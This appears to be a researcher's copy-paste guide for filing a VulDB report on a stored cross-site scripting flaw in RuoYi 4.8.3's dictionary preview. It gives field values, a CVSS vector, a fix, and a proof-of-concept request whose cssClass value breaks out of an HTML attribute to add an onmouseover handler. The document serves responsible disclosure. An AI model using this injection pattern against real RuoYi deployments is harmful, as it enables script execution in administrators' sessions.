# VulDB Web Form Copy-Paste

VulDB does not require two uploaded files. The form still treats the vulnerability write-up and the exploit/PoC as different content. Paste the blocks below into the matching fields, then keep this GitHub repository as the public source.

Policy reference: <https://vuldb.com/kb/submission>

Required by VulDB: vendor name, product name, affected versions, and vulnerability class.

## Suggested field values

Vendor:

```text
y_project
```

If the form expects a display name, use `RuoYi` / `yangzongzhuan`.

Product:

```text
RuoYi
```

Affected version:

```text
4.8.3
```

Vulnerability class:

```text
Cross Site Scripting
```

CWE:

```text
CWE-79
```

Title:

```text
RuoYi 4.8.3 stored XSS via dictionary preview cssClass
```

Affected file / component:

```text
type.html / SysDictDataController.addSave / SysDictData.cssClass
```

Affected argument / parameter:

```text
cssClass
```

Authentication:

```text
Required (system:dict:add). Super-admin is not required.
```

User interaction:

```text
Required. Victim opens /system/dict, opens the drawer, and hovers the malicious label.
```

Remote:

```text
Yes
```

CVSS 3.1 reference (assessment only, not an assigned score):

```text
AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N
```

Suggested score: `8.3`

## Description / Summary field

Paste only this block. Do not paste the full advisory or the PoC here.

```text
RuoYi 4.8.3 (commit 3b3941abeb5402297e5b4de82a30e6471c2239f3) is affected by stored cross-site scripting in the dictionary-data drawer preview.

A user with system:dict:add can persist cssClass through POST /system/dict/data/add. The field has a length check only. The default XSS filter (xss.enabled=true) strips tags but keeps double quotes. The v4.8.3 renderDrawer() function concatenates cssClass into <span class="..."> and parses it with jQuery .html(). A quote can close the class attribute and add an event handler.

A local Docker test stored cssClass=x" onmouseover="document.body.dataset.cveProbe=1 with a non-admin ry account. After an administrator opened /system/dict and the sys_normal_disable drawer, the DOM contained <span class="x" onmouseover="document.body.dataset.cveProbe=1">E2E_XSS_PROBE</span>. Dispatching mouseover set document.body.dataset.cveProbe to 1.

This is distinct from RuoYi issues 212, 308, 320, and 329, which use other fields and sinks. v4.8.2 does not contain this drawer path.

Advisory: https://github.com/Bob-wentao/security-report-for-ruoyi-dictionary-preview-stored-xss
```

## Exploit / PoC field

Paste the contents of `poc/README.md`. Do not paste the full advisory into the exploit field.

Short version if the field is small:

```text
Authorized lab only.

Prerequisite: attacker session with system:dict:add on RuoYi 4.8.3. Victim opens /system/dict and hovers the stored label.

POST /system/dict/data/add
dictLabel=E2E_XSS_PROBE
dictValue=cve_e2e_xss_20260906
dictType=sys_normal_disable
cssClass=x" onmouseover="document.body.dataset.cveProbe=1
listClass=
status=0
isDefault=N

Observed write: {"msg":"操作成功","code":0}
Stored css_class: x" onmouseover="document.body.dataset.cveProbe=1
create_by: ry

Victim trigger on /system/dict drawer for sys_normal_disable:
document.querySelector('#drawerBody span[onmouseover]').outerHTML
-> <span class="x" onmouseover="document.body.dataset.cveProbe=1">E2E_XSS_PROBE</span>
dispatch mouseover -> document.body.dataset.cveProbe === "1"

Control: cssClass=label-safe and empty listClass renders <span class="label-safe">...</span> with no event attribute.

Full PoC: https://github.com/Bob-wentao/security-report-for-ruoyi-dictionary-preview-stored-xss
```

## External source

```text
https://github.com/Bob-wentao/security-report-for-ruoyi-dictionary-preview-stored-xss
```

## Software link

```text
https://github.com/yangzongzhuan/RuoYi/releases/tag/v4.8.3
```

## Countermeasure field

```text
Do not concatenate cssClass, dictLabel, dictValue, or listClass into HTML strings. Build DOM nodes with createElement, textContent, and classList. If class extension is required, allow only [A-Za-z0-9_-] tokens on the server and use a fixed enum for listClass. Encode at the output context. Cover add and edit APIs, and clean existing stored values. Add a regression test that cssClass=x" onmouseover="... must not create an event attribute.
```

## CVE request

Request a CVE only if no other CNA is already handling this issue. Attach the English advisory, commit hash, and this repository URL.
